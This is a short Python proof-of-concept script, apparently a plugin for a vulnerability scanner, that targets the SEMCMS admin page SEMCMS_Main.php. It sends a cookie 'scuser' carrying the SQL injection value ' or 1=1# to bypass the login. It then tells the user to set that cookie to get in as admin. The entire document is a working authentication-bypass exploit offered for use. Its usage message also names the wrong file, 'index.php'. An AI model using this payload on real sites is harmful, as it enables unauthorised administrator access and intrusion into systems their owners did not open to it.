from lib.core.data import target
import urlparse
import requests
import re
def poc():
	try:
		if  not target.url.endswith("SEMCMS_Main.php"):
			print("[*] Please make sure the url end with 'index.php'")
			exit()
		evilcookie = {
			"scuser": "' or 1=1#"
		}
		r = requests.get(target.url,cookies=evilcookie)

		# make sure log in
		if r.text.find("top.location.href='index.html'") < 0:
			print("[*] Log in SEMCMS_Main.php as admin")
			print("[*] Set the evil cookie: scuser=' or 1=1#")
			print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
		else:
			raise KeyError
	except KeyError as e:
		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
